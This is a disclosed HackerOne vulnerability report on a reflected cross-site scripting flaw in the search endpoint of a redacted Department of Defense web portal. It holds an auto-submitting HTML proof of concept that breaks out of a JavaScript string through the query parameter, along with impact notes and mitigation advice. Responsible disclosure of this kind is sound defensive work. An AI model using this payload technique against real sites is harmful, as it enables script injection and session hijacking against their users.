# XSS found for https://█████████

## Report Details
- **Report ID**: 2670521
- **URL**: https://hackerone.com/reports/2670521
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-08-20T06:26:14.302Z
- **Disclosed**: 2024-08-29T17:46:25.050Z

## Reporter
- **Username**: thpless
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
* Location: POST request to the endpoint `/web/guest/search`
* Parameter Affected: `query=`
* Proof of Concept:

```
<html>
<body>
<script>
	window.onload = function(){document.forms['XSS'].submit();}
</script>
	<form id='XSS' action='https://█████████/web/guest/search' method='post'>
		<input type='text' name='query' value="'};alert('XSS');var x={y:'">
	</form>
</body>
</html>
```

## Impact

An attacker can craft a malicious payload and trick a user into sending a POST request to the vulnerable endpoint. The unvalidated and unsanitized data is then reflected in the server’s response, allowing the attacker to execute arbitrary JavaScript code in the victim’s browser. This could lead to session hijacking, redirection to malicious sites, or unauthorized actions being performed in the context of the authenticated user.

## System Host(s)
██████████

## Affected Product(s) and Version(s)
██████████ WebPortal

## CVE Numbers


## Steps to Reproduce
You can download the added exploit.html and open it in a browser

████

## Suggested Mitigation/Remediation Actions
To fix this issue, ensure that all user-supplied data is properly sanitized and encoded before being reflected in the server's response. Implementing Content Security Policy (CSP) headers can also mitigate the risk of XSS attacks by restricting the sources from which scripts can be loaded.



## Attachments
No attachments
